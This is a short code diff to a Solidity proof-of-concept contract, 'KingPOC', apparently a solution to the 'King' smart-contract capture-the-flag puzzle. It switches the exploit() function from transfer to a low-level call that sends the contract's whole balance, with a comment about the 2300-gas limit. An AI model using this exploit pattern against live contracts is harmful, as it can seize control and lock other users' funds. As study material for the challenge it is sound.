@@ -10,7 +10,7 @@ contract KingPOC {
     }
 
     function exploit() public payable {
-        // address(king).call{value: 1 ether}("");
-        payable(king).transfer(1 ether);
+        address(king).call{value: address(this).balance}("");
+        //payable(king).transfer(1 ether); //gas over 2300, trigger revert
     }
 }
